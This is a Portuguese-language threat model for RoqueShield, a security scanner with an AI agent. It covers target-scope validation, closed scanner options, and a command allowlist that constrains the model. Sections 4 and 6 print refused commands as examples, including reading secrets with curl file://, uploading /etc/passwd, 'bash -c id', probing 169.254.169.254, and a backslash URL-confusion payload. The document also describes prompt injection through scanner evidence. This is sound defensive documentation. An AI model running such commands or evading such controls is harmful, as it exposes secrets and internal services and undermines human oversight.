# Modelo de ameaças

*Tradução de [THREAT-MODEL.md](../THREAT-MODEL.md), a versão principal, em inglês. Se as duas divergirem, vale a em inglês.*

> Quem poderia abusar do RoqueShield, como, e o que no código impede. Para quem opera um shield em ambiente regulado, revisa a segurança dele ou mexe num controle. Cada mitigação cita o arquivo que a implementa; o que não é imposto por código aparece como recomendação ou limite conhecido, não como controle. Atualizado com a revisão de segurança independente de novembro de 2026 (CHANGELOG `[0.5.0]` e `[0.5.1]`).
>
> Como reportar uma vulnerabilidade, e o checklist de endurecimento, estão no [SECURITY.md](../../SECURITY.md). As variáveis estão na [REFERÊNCIA, seção 6](REFERENCIA.md#6-variáveis-de-ambiente).

## Sumário

1. [A premissa](#1-a-premissa)
2. [Atores e cenários](#2-atores-e-cenários)
3. [Dados sensíveis](#3-dados-sensíveis)
4. [Escopo e validação do alvo](#4-escopo-e-validação-do-alvo)
5. [Opções de scanner](#5-opções-de-scanner)
6. [O agente de IA e a coleira de comandos](#6-o-agente-de-ia-e-a-coleira-de-comandos)
7. [Contas, tokens e primeiro uso](#7-contas-tokens-e-primeiro-uso)
8. [O container standalone](#8-o-container-standalone)
9. [Triagem de IA e o gateway de modelo](#9-triagem-de-ia-e-o-gateway-de-modelo)
10. [A trilha de auditoria](#10-a-trilha-de-auditoria)
11. [Limites conhecidos](#11-limites-conhecidos)
12. [Fora do escopo](#12-fora-do-escopo)

---

## 1. A premissa

O RoqueShield dispara varredura ativa contra alvo de outra pessoa, operado por um time pequeno, muitas vezes em ambiente regulado. O atacante mais provável não é alguém de fora: é **o operador**, com credencial legítima, apontando a ferramenta para o alvo errado. Por isso a checagem de escopo e a referência de autorização vêm antes de qualquer pacote sair, recusar é o padrão, e os controles que mais importam são os que não dependem de o operador acertar.

A segunda forma de risco é a ferramenta se voltar contra si mesma: um alvo, uma saída de scanner ou uma resposta do modelo que faz o shield alcançar os próprios serviços, os próprios segredos ou o metadata da nuvem. A revisão de novembro foi quase toda sobre isso.

## 2. Atores e cenários

| Ator | Tem | Cenário | Mitigação |
| --- | --- | --- | --- |
| Operador descuidado | token `operator` | Aponta para produção achando que é dev, ou para endereço interno | `LAB_ONLY=true` (padrão) com `TARGET_ALLOWLIST`; `REQUIRE_AUTH_REF`; [seção 4](#4-escopo-e-validação-do-alvo) |
| Operador mal-intencionado | token `operator` | Scan não autorizado; usa opção de scanner para ler arquivo ou alcançar outro host | Lista fechada de opções ([seção 5](#5-opções-de-scanner)); `authorization_ref` e `scan.create` na trilha; RBAC |
| Quem chega primeiro à porta | Acesso de rede, sem conta | Vira admin antes do dono | `/setup` exige o código de primeiro uso ou o `APP_TOKEN`, é serializado e tem freio ([seção 7](#7-contas-tokens-e-primeiro-uso)) |
| Quem chuta senha | Acesso de rede | Força bruta no login ou no código de primeiro uso | Freio por e-mail+IP e por IP, scrypt |
| Alvo hostil | Controla o que o scanner lê | Prompt injection na evidência; DNS que volta a apontar para endereço interno; URL que os parsers leem diferente | Scrubber e nenhum comando roda por padrão ([seção 6](#6-o-agente-de-ia-e-a-coleira-de-comandos)); guarda dura de loopback/link-local; barra invertida e caractere de controle recusados |
| O modelo de IA | Propõe comandos | Lê `/data/secrets`, chama a própria API do shield, escaneia o metadata | `AGENT_LIVE_EXECUTION=false` por padrão; a coleira confere o argv inteiro |
| Processo de scanner comprometido | Execução de código como o usuário do worker | Lê segredos e o banco | Ambiente por processo no standalone; além disso, limite conhecido ([seção 11](#11-limites-conhecidos)) |
| Cadeia de suprimentos | Dependência ou imagem base envenenada | Execução de código no motor | `uv.lock`; Trivy na imagem antes da tag final (`scripts/release-docker.sh`); `.trivyignore.yaml` com data de vencimento |
| Quem rouba um backup ou um volume | O volume `/data` ou um dump do Postgres | Lê o `APP_TOKEN`, a `SECRETS_KEY` e todos os achados | Recomendação, não controle: trate o backup como segredo, cifre em repouso |

## 3. Dados sensíveis

| Dado | Onde aparece | Tratamento |
| --- | --- | --- |
| Cartão, CPF, e-mail, token no tráfego HTTP | `Finding.evidence` | `scrubber.py` antes do modelo e na evidência do AI Fix Bundle |
| Segredos achados pelo gitleaks e pelo trufflehog | `evidence.snippet` do achado | **Não redigido** pelo scrubber quando o padrão não está na lista dele (tokens do GitHub e do Slack, senhas). Veja [AI-FIX-BUNDLE.md](AI-FIX-BUNDLE.md#2-garantias-e-onde-cada-uma-para) |
| Cabeçalhos de scan autenticado | O job no Redis | Nunca gravados em `scans`; valores redigidos na entrada de auditoria (`redact_audit_auth`) |
| `APP_TOKEN`, `SESSION_SECRET`, `SECRETS_KEY`, `ZAP_API_KEY`, `REDIS_PASSWORD`, `SETUP_CODE` | `/data/secrets` (standalone) ou o ambiente | Gerados no primeiro boot, nunca impressos; arquivos `0600` |
| Chave de provedor de IA definida na tela | O banco | Cifrada com `SECRETS_KEY`; a trilha registra só "(trocado)" |
| Token e senha de usuário | O banco | Token guardado como hash; senha com scrypt |
| `authorization_ref` | `scans` e a trilha de auditoria | Só-acréscimo no Postgres ([seção 10](#10-a-trilha-de-auditoria)) |

## 4. Escopo e validação do alvo

O `orchestrator/domain/target_validator.py` roda quando um alvo é criado (`POST /targets`), de novo quando o scan é enfileirado (`POST /scans`), sobre o `auth.openapi_url` e dentro da coleira do agente. `POST /targets/check` roda sem criar nada e diz por que um alvo foi recusado.

**Sempre recusado, qualquer que seja a configuração:**

- valor que começa com `-` (injeção de flag no argv do scanner);
- barra invertida, espaço e caractere de controle: o parser de URL do Python e o navegador discordam sobre o host de `http://127.0.0.1:8090\@exemplo.com/`, então o validador veria um host e o ZAP iria a outro;
- esquema que não seja `http` ou `https` numa URL;
- URL de repositório com credencial embutida;
- **link-local**, que inclui o metadata da nuvem `169.254.169.254`: nunca, nem com `LAB_ONLY=false`, nem com nome na allowlist;
- **loopback**: só quando a allowlist traz o próprio endereço (`127.0.0.1`, `127.0.0.0/8`, `::1` ou `localhost`). Um *nome* na allowlist não abre loopback, porque um nome liberado quando resolvia para a rede da casa pode passar a resolver para `127.0.0.1` (DNS rebinding). Um IPv6 que embrulha `127.0.0.1` (NAT64, 6to4, mapeado) conta como loopback.

Essa é a "guarda dura" (`_guarda_dura`). Dentro do container, loopback é o próprio shield: a API, o Redis e o ZAP.

**Com `LAB_ONLY=true` (o padrão)**, um host fora da `TARGET_ALLOWLIST` também é recusado quando é privado, reservado, multicast, CGNAT (`100.64.0.0/10`, a faixa do Tailscale), `198.18.0.0/15`, NAT64 ou 6to4, ou quando algum endereço para o qual ele resolve é. Nome que não resolve também é recusado (fail closed). Entrada da allowlist pode ser host, CIDR ou `*.dominio`. `LAB_ONLY=false` desliga esta parte e mantém a guarda dura.

Conferido aqui, com `LAB_ONLY=true` e allowlist vazia:

```
RECUSADO http://127.0.0.1:8080/ -> host '127.0.0.1' é loopback (dentro do container, o próprio RoqueShield) e só vira alvo com o próprio endereço na allowlist
RECUSADO http://169.254.169.254/ -> host '169.254.169.254' é link-local (o metadata da nuvem) e não pode ser alvo
RECUSADO 127.0.0.1:6379/tcp -> host '127.0.0.1' é loopback (...)
RECUSADO http://127.0.0.1:8090\@example.com/ -> target.value com barra invertida, espaço ou caractere de controle
RECUSADO http://100.64.1.1/ -> host '100.64.1.1' em rede privada/loopback/IMDS e nao esta em TARGET_ALLOWLIST
```

A terceira linha é um alvo do tipo `port`: antes da 0.5.1, esse tipo pulava a checagem e chegava ao Redis do próprio container.

**Autorização.** Com `REQUIRE_AUTH_REF=true`, `POST /scans` sem `authorization_ref` é `403`. O padrão é `false` na imagem e `true` no `docker/compose.prod.yml`.

## 5. Opções de scanner

O `ScanIn.options` era um dict livre que ia para o adapter: `nmap.nmap_args` virava argv do nmap (alvos extras, `-oN` sobre arquivo, `--script`), e `nuclei.templates` e `semgrep.config` aceitavam qualquer caminho. Agora o `orchestrator/domain/opcoes.py` tem uma lista fechada por scanner, com tipo e faixa, e o `POST /scans` responde `422` com o nome do primeiro campo fora dela. Exemplos: o nmap não aceita opção nenhuma; o `config` do semgrep aceita só `auto` ou um pacote do registro `p/...`; o nuclei aceita `rate_limit` (1 a 500) e `severity`. A lista completa está na [REFERÊNCIA](REFERENCIA.md).

## 6. O agente de IA e a coleira de comandos

A investigação (`POST /investigate/{finding_id}`) roda um modelo em laço que propõe comandos de segurança. O modelo não é confiável; quem decide é `check_command()` em `orchestrator/ai/agentic/executor.py`, uma função pura, sem I/O.

**Por padrão, ele só planeja.** `AGENT_LIVE_EXECUTION=false` é o padrão. Desligado, `dry_run=false` recebe `403 execução real do agente desligada`, e o executor também força o `dry_run` sozinho, então um chamador que pule a rota não pula a trava. Ligado, `dry_run=false` ainda exige um admin (`config:manage`). `dry_run=true`, o padrão da requisição, devolve os comandos que o agente rodaria e não roda nenhum.

**O que a coleira confere, antes de qualquer comando:**

1. **Binário por fase.** Recon: `nmap`, `naabu`, `httpx`, `subfinder`, `dig`, `host`, `nslookup`, `whois`, `curl`, `openssl`. Exploração dirigida: `sqlmap`, `nuclei`, `nikto`, `curl`, `openssl`. Força bruta, DoS, fuzzers, shells e interpretadores são recusados pelo nome.
2. **Sem shell.** O comando é uma lista argv para `create_subprocess_exec`, e argumento com metacaractere de shell (`; | & $ \` > <`, quebra de linha) é recusado mesmo assim, como sinal de injeção.
3. **Todo argumento, não só o alvo.** Antes da 0.5.1 a coleira conferia só o alvo do achado, então `curl file:///data/secrets/APP_TOKEN`, `curl -d @arquivo`, `curl http://127.0.0.1:8080/` e `nmap 169.254.169.254` passavam com um alvo válido. Agora todo URL, host, IP, endereço numérico (`127.1`, `0x7f000001`), caminho e `@arquivo` no argv tem que ser o próprio alvo; esquema que não seja http(s) é recusado; faixa CIDR é recusada.
4. **Flags que leem arquivo, escrevem arquivo ou desviam a conexão** são recusadas: `-o*`, `--script`, `-iL`, `-iR`, `--os-*`, `--sql-shell`, `--alert` do sqlmap, `--tamper`, `-r`, `--config` do curl, `--resolve`, `--proxy`, `-L`, e outras.
5. **O curl tem uma lista do que pode usar**, porque tem mais de 250 opções e dezenas mexem em arquivo: as curtas `-sSIikvfgNq46G` e `-XHAemd`, e uma lista curta de longas. O resto é recusado.
6. **O alvo** passa pelo mesmo validador dos scanners ([seção 4](#4-escopo-e-validação-do-alvo)).

Conferido aqui contra o alvo `https://example.com`:

```
True  curl -sS https://example.com/        -> autorizado
False curl file:///data/secrets/APP_TOKEN  -> ... esquema 'file' não permitido
False curl -d @/data/x https://example.com -> ... lê arquivo local (@)
False curl http://127.0.0.1:8080/          -> ... URL para outro host ('127.0.0.1'), não o alvo
False nmap 169.254.169.254                 -> ... endereço numérico '169.254.169.254' não é o alvo
False nmap --script vuln example.com       -> flag '--script' recusada (...)
False curl -T /etc/passwd https://example.com -> ... opção -T do curl fora da lista permitida
False bash -c id                           -> binário 'bash' é proibido em qualquer fase (...)
```

**Quando roda** (só com a execução real ligada): com timeout duro (60 s por padrão, 180 s no máximo), saída cortada em 8000 caracteres e, no modo local, ambiente mínimo (`PATH`, `HOME`, `LANG`, `LC_ALL`, `TZ`, `TMPDIR`), para o `APP_TOKEN`, o `SESSION_SECRET` e a chave de cifra da API não chegarem a um curl. `AGENT_EXECUTOR=auto` (padrão) usa o container `cai-kali-toolbox` por `docker exec` quando ele está de pé e alcançável, e senão roda no próprio processo da API. A stack publicada não tem container Kali, então na prática é local.

**Auditoria.** A intenção (`investigate.run`) é gravada antes da execução, e cada decisão, inclusive cada recusa, depois (`investigate.commands`).

A coleira é defesa em profundidade, não sandbox. Cada rodada de revisão achou mais uma forma de uma flag de scanner ler arquivo ou sair do alvo. Ligue a execução real só em ambiente isolado.

## 7. Contas, tokens e primeiro uso

- **Papéis** (`orchestrator/domain/roles.py`): `viewer` lê; `auditor` lê e vê a trilha de auditoria; `operator` dispara e apaga scan, mas não lê a trilha nem gerencia usuários; `admin` tem tudo. Papel desconhecido cai para `viewer`.
- **Credenciais** (`orchestrator/api/deps.py`): o `APP_TOKEN` como admin de serviço; tokens por usuário guardados como hash; sessões OIDC Bearer que releem o usuário no banco a cada requisição; o cookie do login por senha (`rs_session`, `httpOnly`, `SameSite=Strict`), que ainda exige o cabeçalho `X-RoqueShield` em escrita. Sessões têm versão: logout, troca de senha e desativação encerram toda sessão emitida antes. O último admin ativo não pode ser desativado nem rebaixado.
- **`?token=`** é aceito só na rota SSE `/ui/api/events`, e só com o `APP_TOKEN`, para o token não parar em log nem em `Referer`.
- **Freio de login** (`orchestrator/auth/limite.py`): 5 falhas por e-mail+IP e 50 por IP somando os e-mails, depois uma espera que dobra de 30 s até 15 min. Mora na memória do processo da API, então reiniciar zera; a entrada `user.login_failed` na trilha é o registro.
- **Primeiro uso** (`orchestrator/api/routers/conta.py`): `POST /setup` cria o primeiro admin só com o código de primeiro uso (`/data/secrets/SETUP_CODE`) ou o `APP_TOKEN`, só enquanto não existe usuário (depois, `410`), e serializado por uma linha de chave fixa, então dois setups simultâneos não criam dois admins. Código errado passa pelo mesmo freio de senha errada (5 por origem, depois `429` com `Retry-After`); antes da 0.5.1 cada tentativa errada gravava uma linha de auditoria sem limite. O `install.sh` passa o código no fragmento do endereço (`#setup=`), que o navegador nunca manda ao servidor.
- **A API se recusa a subir** com o `APP_TOKEN` de exemplo, a não ser com `ALLOW_INSECURE_APP_TOKEN=true`.

## 8. O container standalone

A imagem `roqueos-shield:<versão>-standalone` roda a API, o worker, o Redis e o ZAP num container só, sob um supervisor em Python (`orchestrator/standalone/supervisor.py`), como UID 1000. O `docker/compose.prod.yml` a roda com `cap_drop: [ALL]` e `no-new-privileges`.

- **Redis e ZAP escutam só em `127.0.0.1`**, e os dois exigem segredo: o Redis uma senha (o worker desserializa job, e o ZAP no mesmo container processa conteúdo hostil), o ZAP uma chave de API, mandada no cabeçalho `X-ZAP-API-Key` e nunca na URL.
- **Nenhum segredo na linha de comando.** A senha do Redis e, desde a 0.5.1, a chave do ZAP vão em arquivos `0600` em `/data/secrets` (`redis.conf`, `zap.properties`). Na linha de comando elas ficavam legíveis por todo processo do container em `/proc/<pid>/cmdline`, inclusive pelos scanners.
- **Cada processo recebe só os segredos que usa.** O worker, cujos filhos são os scanners, não recebe `APP_TOKEN`, `SESSION_SECRET`, `SETUP_CODE` nem `REDIS_PASSWORD`. Redis e ZAP não recebem nenhum dos segredos no ambiente. O worker fica com `SECRETS_KEY` (decifra a chave de IA), `ZAP_API_KEY`, `DATABASE_URL` e `REDIS_URL`, e os scanners herdam esse ambiente.
- **A porta.** O `install.sh` publica em `127.0.0.1`. Faça o primeiro uso antes de publicar a porta em outro lugar, e ponha um proxy reverso com TLS na frente.

## 9. Triagem de IA e o gateway de modelo

- **Prompt injection.** Um scanner pode devolver evidência escrita para conduzir o modelo. O que limita o estrago: o scrubber tira os padrões sensíveis antes da chamada ao modelo (`orchestrator/ai/analyzer.py`); a saída da triagem só ajusta severidade e texto, não executa nada; e os comandos do agente passam pela coleira e, por padrão, não são executados.
- **Soberania.** Quando o modelo principal é local e falha, o fallback para um provedor na nuvem manda os achados para fora, com o scrubber como única barreira. `ALLOW_CLOUD_FALLBACK=false` proíbe. O padrão no `Settings` é `true`; o `docker/compose.prod.yml` põe `false`. Implantação regulada deve manter `false`.
- **Credencial do modelo.** `LLM_API_KEY` vinda do ambiente trava também o `LLM_API_BASE`, então uma requisição não consegue desviar a chave para outro endereço.

## 10. A trilha de auditoria

Gravada por `orchestrator/audit/` para: `scan.create` (com `authorization_ref`), `scan.delete`, `target.create`, `finding.status_change`, `investigate.run` e `investigate.commands`, mudanças de configuração em `/settings/*` (valor de segredo nunca vai para a trilha), `setup.denied` e `setup.admin_created`, e os eventos de usuário (`user.create`, `user.set_role`, `user.deactivate`, `user.set_password`, `user.rotate_token`, `user.login`, `user.login_failed`, `user.logout`).

**Só-acréscimo só no Postgres.** Um trigger (migration 0004) recusa `UPDATE` e `DELETE` em `audit_log`. O SQLite, banco padrão do standalone, não tem esse trigger. `REQUIRE_IMMUTABLE_AUDIT=true` faz a API se recusar a subir em SQLite; o `docker/compose.prod.yml` liga.

**Não auditado:** a exportação para o DefectDojo (`POST /reports/{id}/export/defectdojo`), o scan OSINT de exposição (`POST /exposure/scan`), e mudanças em `TARGET_ALLOWLIST` ou em `config/exposure_targets.yml` feitas no ambiente ou no disco, e não por `/settings/scope`.

## 11. Limites conhecidos

Não são vulnerabilidades, mas as bordas do que os controles fazem. Se achar um jeito de passar por um deles, reporte ([SECURITY.md](../../SECURITY.md)).

- **Na imagem standalone todo processo roda com o mesmo usuário.** A API, o worker, o ZAP e os scanners são UID 1000 e conseguem ler `/data/secrets` e o banco SQLite. O ambiente por processo tira os segredos mais valiosos do ambiente dos scanners, mas um scanner comprometido não está isolado dos arquivos. A stack de compose (`docker/compose.prod.yml`) separa Postgres, Redis e ZAP em containers próprios; a API e os workers continuam dividindo imagem e usuário.
- **Os scanners herdam a `SECRETS_KEY`.** O worker precisa dela, e os adapters não passam um ambiente reduzido aos subprocessos.
- **O DNS é resolvido mais de uma vez.** A checagem de escopo resolve quando o alvo é criado e quando o scan é enfileirado; o scanner resolve de novo depois. Loopback e link-local são recusados mesmo para nome na allowlist, mas um nome ainda pode ser reapontado para outro endereço privado nesse intervalo.
- **O scrubber é uma lista de padrões.** O que não está nela chega ao modelo (na triagem) e à evidência do AI Fix Bundle como foi escrito, inclusive segredo achado pelos scanners de segredo.
- **A coleira não é sandbox** ([seção 6](#6-o-agente-de-ia-e-a-coleira-de-comandos)). No modo local, o comando roda no espaço de processo da API, com o usuário da API.
- **O freio de login e de primeiro uso mora na memória** e zera com o container.
- **A conexão GMP do Greenbone é TCP puro** (`GREENBONE_PORT`, padrão 9390). Mantenha em rede privada.

## 12. Fora do escopo

- O RoqueShield não é WAF; bloquear exploit ativo é trabalho da plataforma alvo.
- Não substitui pentest manual de aplicação crítica.
- A triagem de IA não é evidência forense: uma pessoa valida os achados antes de agir.
- A exportação para o DefectDojo não é trilha de compliance com autoridade.
- Vulnerabilidade nos próprios scanners (nmap, ZAP, nuclei, trivy, semgrep): reporte no projeto de cada um.

## Quando algo não funciona

- O scan é recusado com `target rejeitado pela policy`: o alvo está fora do escopo ([seção 4](#4-escopo-e-validação-do-alvo)). `POST /targets/check` diz por quê; [OPERACAO.md](OPERACAO.md) explica como liberar um alvo.
- `POST /scans` responde `422 options.<scanner>.<campo> não é aceito`: a opção não está na lista fechada ([seção 5](#5-opções-de-scanner)).
- A investigação responde `403` em `dry_run=false`: a execução real está desligada, que é o padrão, ou quem chamou não é admin.
- A API não sobe com `REQUIRE_IMMUTABLE_AUDIT=true`: o banco é SQLite; use Postgres. Outras falhas de subida estão em [QUANDO-QUEBRA.md](QUANDO-QUEBRA.md).
